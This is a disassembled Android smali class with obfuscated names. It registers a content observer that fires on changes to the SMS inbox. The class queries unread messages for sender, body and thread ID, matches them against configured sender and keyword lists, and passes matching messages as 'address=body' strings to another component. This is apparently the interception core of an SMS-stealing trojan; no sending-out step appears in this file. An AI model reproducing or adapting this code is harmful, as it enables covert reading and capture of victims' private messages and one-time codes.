.class public final Lc/aguoqkle/n/w;
.super Landroid/database/ContentObserver;


# instance fields
.field public a:Lc/aguoqkle/n/u;

.field public b:Lc/aguoqkle/n/CocoMi;

.field private c:Landroid/content/ContentResolver;


# direct methods
.method public constructor <init>(Landroid/content/ContentResolver;Lc/aguoqkle/n/u;Lc/aguoqkle/n/CocoMi;)V
    .locals 0

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    iput-object p3, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iput-object p1, p0, Lc/aguoqkle/n/w;->c:Landroid/content/ContentResolver;

    iput-object p2, p0, Lc/aguoqkle/n/w;->a:Lc/aguoqkle/n/u;

    return-void
.end method


# virtual methods
.method public final onChange(Z)V
    .locals 10

    const/4 v9, 0x2

    const/4 v8, 0x1

    const/4 v7, 0x0

    const/4 v6, -0x1

    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget v0, v0, Lc/aguoqkle/n/CocoMi;->m:I

    if-lez v0, :cond_1

    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iput v7, v0, Lc/aguoqkle/n/CocoMi;->m:I

    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    :cond_0
    return-void

    :cond_1
    iget-object v0, p0, Lc/aguoqkle/n/w;->c:Landroid/content/ContentResolver;

    const-string v1, "content://sms/inbox"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x5

    new-array v2, v2, [Ljava/lang/String;

    const-string v3, "_id"

    aput-object v3, v2, v7

    const-string v3, "address"

    aput-object v3, v2, v8

    const-string v3, "read"

    aput-object v3, v2, v9

    const/4 v3, 0x3

    const-string v4, "body"

    aput-object v4, v2, v3

    const/4 v3, 0x4

    const-string v4, "thread_id"

    aput-object v4, v2, v3

    const-string v3, "read=?"

    new-array v4, v8, [Ljava/lang/String;

    const-string v5, "0"

    aput-object v5, v4, v7

    const-string v5, "date desc"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    if-eqz v0, :cond_0

    move-object v1, v0

    :cond_2
    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v2, Lc/aguoqkle/n/v;

    invoke-direct {v2}, Lc/aguoqkle/n/v;-><init>()V

    const-string v0, "_id"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v6, :cond_3

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v2, Lc/aguoqkle/n/v;->a:Ljava/lang/String;

    :cond_3
    const-string v0, "thread_id"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v6, :cond_4

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v2, Lc/aguoqkle/n/v;->b:Ljava/lang/String;

    :cond_4
    const-string v0, "address"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v6, :cond_5

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v2, Lc/aguoqkle/n/v;->c:Ljava/lang/String;

    :cond_5
    const-string v0, "body"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v6, :cond_6

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v2, Lc/aguoqkle/n/v;->d:Ljava/lang/String;

    :cond_6
    const-string v0, "read"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v6, :cond_7

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v2, Lc/aguoqkle/n/v;->e:Ljava/lang/String;

    :cond_7
    iget-object v0, v2, Lc/aguoqkle/n/v;->c:Ljava/lang/String;

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    iget-object v0, v2, Lc/aguoqkle/n/v;->d:Ljava/lang/String;

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    iget-object v3, v2, Lc/aguoqkle/n/v;->c:Ljava/lang/String;

    iget-object v4, v2, Lc/aguoqkle/n/v;->d:Ljava/lang/String;

    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_9

    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    iget-object v5, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget v5, v5, Lc/aguoqkle/n/CocoMi;->d:I

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lc/aguoqkle/n/t;

    iget-object v0, v0, Lc/aguoqkle/n/t;->f:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_9

    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    iget-object v5, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget v5, v5, Lc/aguoqkle/n/CocoMi;->d:I

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lc/aguoqkle/n/t;

    iget-object v0, v0, Lc/aguoqkle/n/t;->f:Ljava/lang/String;

    invoke-virtual {v4, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v6, :cond_9

    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    move v0, v7

    :goto_1
    iget-object v3, p0, Lc/aguoqkle/n/w;->a:Lc/aguoqkle/n/u;

    invoke-virtual {v3}, Lc/aguoqkle/n/u;->obtainMessage()Landroid/os/Message;

    move-result-object v3

    if-nez v0, :cond_e

    iput v9, v2, Lc/aguoqkle/n/v;->f:I

    :goto_2
    iput-object v2, v3, Landroid/os/Message;->obj:Ljava/lang/Object;

    iget-object v4, v2, Lc/aguoqkle/n/v;->d:Ljava/lang/String;

    iget-object v2, v2, Lc/aguoqkle/n/v;->c:Ljava/lang/String;

    iget-object v0, p0, Lc/aguoqkle/n/w;->a:Lc/aguoqkle/n/u;

    invoke-virtual {v0, v3}, Lc/aguoqkle/n/u;->sendMessage(Landroid/os/Message;)Z

    if-eqz v1, :cond_8

    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    const/4 v0, 0x0

    move-object v1, v0

    :cond_8
    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_2

    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    iget-object v3, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget v3, v3, Lc/aguoqkle/n/CocoMi;->d:I

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lc/aguoqkle/n/t;

    iget-object v0, v0, Lc/aguoqkle/n/t;->f:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_2

    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->a:Ljava/util/List;

    iget-object v3, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget v3, v3, Lc/aguoqkle/n/CocoMi;->d:I

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lc/aguoqkle/n/t;

    iget-object v0, v0, Lc/aguoqkle/n/t;->f:Ljava/lang/String;

    invoke-virtual {v4, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v6, :cond_2

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "="

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    iget-object v2, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    invoke-virtual {v2, v0}, Lc/aguoqkle/n/CocoMi;->a(Ljava/lang/String;)V

    goto/16 :goto_0

    :cond_9
    move v5, v7

    :goto_3
    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->e:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lt v5, v0, :cond_a

    move v3, v7

    :goto_4
    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->f:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lt v3, v0, :cond_c

    move v0, v8

    goto/16 :goto_1

    :cond_a
    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->e:Ljava/util/List;

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->e:Ljava/util/List;

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {v3, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v6, :cond_b

    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    move v0, v7

    goto/16 :goto_1

    :cond_b
    add-int/lit8 v0, v5, 0x1

    move v5, v0

    goto :goto_3

    :cond_c
    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->f:Ljava/util/List;

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    invoke-static {}, Lc/aguoqkle/n/q;->b()V

    iget-object v0, p0, Lc/aguoqkle/n/w;->b:Lc/aguoqkle/n/CocoMi;

    iget-object v0, v0, Lc/aguoqkle/n/CocoMi;->f:Ljava/util/List;

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {v4, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-eq v0, v6, :cond_d

    invoke-static {}, Lc/aguoqkle/n/q;->a()V

    move v0, v7

    goto/16 :goto_1

    :cond_d
    add-int/lit8 v0, v3, 0x1

    move v3, v0

    goto :goto_4

    :cond_e
    iput v7, v2, Lc/aguoqkle/n/v;->f:I

    goto/16 :goto_2
.end method
